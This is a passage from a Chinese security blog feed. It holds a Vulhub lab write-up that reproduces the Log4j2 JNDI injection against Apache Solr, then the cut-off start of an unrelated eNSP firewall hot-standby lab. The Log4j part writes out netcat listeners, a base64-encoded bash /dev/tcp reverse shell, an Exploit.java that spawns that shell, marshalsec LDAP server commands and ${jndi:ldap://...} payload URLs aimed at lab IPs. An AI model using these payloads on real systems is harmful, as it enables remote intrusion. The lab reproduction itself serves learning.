&lt;h3 id=&#34;法一：JNDI注入工具&#34;&gt;&lt;a href=&#34;#法一：JNDI注入工具&#34; class=&#34;headerlink&#34; title=&#34;法一：JNDI注入工具&#34;&gt;&lt;/a&gt;法一：JNDI注入工具&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;工具一：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在攻击机上nc开启端口监听，等待shell反弹&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 6666&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526164651028.png&#34; alt=&#34;image-20240526164651028&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用JNDI注入工具，开启相对应的LDAP或RMI服务，-A为开启LDAP服务的服务器ip，这里我用的是攻击机的IP，即模拟kali不仅是LDAP服务器，也是用于反弹获取shell的服务器&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;quot;bash -c &amp;#123;echo,[经过base64编码后的命令]&amp;#125;|&amp;#123;base64,-d&amp;#125;|bash&amp;quot; -A [vps ip]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.131/6666 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base64编码后:YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvNjY2NiAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|bash&amp;quot; -A 192.168.100.131&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-26%20165326.png&#34; alt=&#34;屏幕截图 2024-05-26 165326&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据上方工具生成的进行payload构造并请求，可以获取到shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://192.168.100.131:1389/hk5uoj&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165653255.png&#34; alt=&#34;image-20240526165653255&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165835051.png&#34; alt=&#34;image-20240526165835051&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526165912073.png&#34; alt=&#34;image-20240526165912073&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;工具二：JNDIExploit-1.4-SNAPSHOT.jar&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;攻击机同样需要先开启nc监听端口&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后使用工具开启LDAP服务，-i 后面加上对应的ip，可-h查看具体用法&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.100.131&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;构造payload并请求，将shell反弹到攻击机对应ip和端口&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://192.168.100.131:1389/Basic/ReverseShell/192.168.100.131/7777&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170913873.png&#34; alt=&#34;image-20240526170913873&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526170948245.png&#34; alt=&#34;image-20240526170948245&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526171004217.png&#34; alt=&#34;image-20240526171004217&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;法二：编写恶意文件&#34;&gt;&lt;a href=&#34;#法二：编写恶意文件&#34; class=&#34;headerlink&#34; title=&#34;法二：编写恶意文件&#34;&gt;&lt;/a&gt;法二：编写恶意文件&lt;/h3&gt;&lt;p&gt;首先编写bash命令，并开启nc监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 8888&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.131/8888 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base64编码后：YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash：启动Bash shell。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;-i：使Bash以交互式模式运行，这通常意味着它会读取用户输入。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;amp; /dev/tcp/192.168.100.131/8888：这是一个Bash重定向技巧。它将Bash的标准输出（文件描述符1）和标准错误（文件描述符2，由于在此处未明确指定，所以它会跟随标准输出）都重定向到/dev/tcp/192.168.100.131/8888。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/dev/tcp/host/port是某些Unix系统（如Linux）上提供的一种特殊文件，它允许你通过该文件描述符与远程TCP主机和端口进行通信。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在这个例子中，Bash shell尝试连接到IP地址192.168.100.131的8888端口，并将所有输出发送到那里。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0&amp;gt;&amp;amp;1：这是另一个重定向。它将Bash的标准输入（文件描述符0）重定向到之前设置的标准输出（文件描述符1）。由于我们已经将标准输出重定向到/dev/tcp/192.168.100.131/8888，所以这也意味着Bash的标准输入现在来自该TCP连接。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;文件描述符：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0 通常代表标准输入（stdin）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1 通常代表标准输出（stdout）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2 通常代表标准错误（stderr）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;amp;：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这是一个重定向操作符，它将一个文件描述符重定向到另一个文件描述符。具体来说，它将左边的文件描述符指向右边文件描述符所指向的位置。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0&amp;gt;&amp;amp;1：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这意味着将标准输入（stdin，文件描述符 0）重定向到标准输出（stdout，文件描述符 1）当前所指向的位置。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所以，整个命令的效果是：启动一个交互式Bash shell，将其标准输入、输出和错误都重定向到与192.168.100.131的8888端口的TCP连接。这允许攻击者（或测试人员）在远程系统上执行命令，并通过TCP连接查看输出。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c：这告诉bash执行一个由-c选项后面跟随的字符串指定的命令。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|&amp;#123;base64,-d&amp;#125;|：这部分试图使用管道（|）将前面的输出传递给base64 -d命令进行解码。但&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;bash,-i&amp;#125;：再次运行bash，但带有-i选项（交互式），&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;编写恶意文件，命名为Exploit.java&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Runtime;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Process;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class Exploit &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     public Exploit()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             try&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 Runtime.getRuntime().exec(&amp;quot;/bin/bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xMzEvODg4OCAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                &amp;#125;catch(Exception e)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                            e.printStackTrace();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                             &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         public static void main(String[] argv)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                         Exploit e = new Exploit();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后将 Exploit.java 文件进行编译，编译为.class文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javac Exploit.java &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173036485.png&#34; alt=&#34;image-20240526173036485&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后python在该目录下开启一个简单的http服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 5555&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526173304140.png&#34; alt=&#34;image-20240526173304140&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后需要利用工具marshalsec-0.0.3-SNAPSHOT-all.jar来开启LDAP服务，监听1389端口，并制定加载远程类TouchFile.class，在fastjson文章中也有提到&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer  &amp;quot;http://刚才http服务的地址:端口号/#Exploit&amp;quot; 1389&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &amp;quot;http://192.168.100.131:5555/#Exploit&amp;quot; 1389&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec项目下载地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mvn clean package -DskipTests&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174144308.png&#34; alt=&#34;image-20240526174144308&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后就是构造payload并请求，获取shell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134:8983/solr/admin/cores?action=$&amp;#123;jndi:ldap://192.168.100.131:1389/Exploit&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/26/vulhub/%E3%80%90vulhub%E3%80%91Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240526174651781.png&#34; alt=&#34;image-20240526174651781&#34;&gt;&lt;/p&gt;
&lt;p&gt;其实几种方法本质上都是一样的，没有太大区别，但都尝试一遍过后，对整个漏洞利用的流程会更加的清晰，也更容易理解&lt;/p&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/vuls/382838.html&#34;&gt;https://www.freebuf.com/vuls/382838.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cloud.tencent.com/developer/article/1921530&#34;&gt;https://cloud.tencent.com/developer/article/1921530&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Bossfrank/article/details/130148819&#34;&gt;https://blog.csdn.net/Bossfrank/article/details/130148819&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/</guid>
            <title>防火墙双机热备</title>
            <link>https://w-sqrt7.github.io/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/</link>
            <category>原创</category>
            <category>网基</category>
            <category>eNSP</category>
            <pubDate>Fri, 10 May 2024 22:29:08 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;防火墙双机热备&#34;&gt;&lt;a href=&#34;#防火墙双机热备&#34; class=&#34;headerlink&#34; title=&#34;防火墙双机热备&#34;&gt;&lt;/a&gt;防火墙双机热备&lt;/h1&gt;&lt;h2 id=&#34;实验拓扑图一：&#34;&gt;&lt;a href=&#34;#实验拓扑图一：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图一：&#34;&gt;&lt;/a&gt;实验拓扑图一：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/05/10/eNSP/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/image-20240510213512085.png&#34; alt=&#34;image-20240510213512085&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：&#34;&gt;&lt;a href=&#34;#实验过程：&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先将pc及涉及到的各个端口ip进行如上图配置&lt;/p&gt;
&lt;p&gt;FW1&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/0]ip address 192.168.1.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]ip address 20.1.1.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1]int g1/0/3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[USG1-GigabitEthernet1/0/3]ip address 10.1.1.1 24&lt;/span&gt;&lt;br&gt;&lt;span 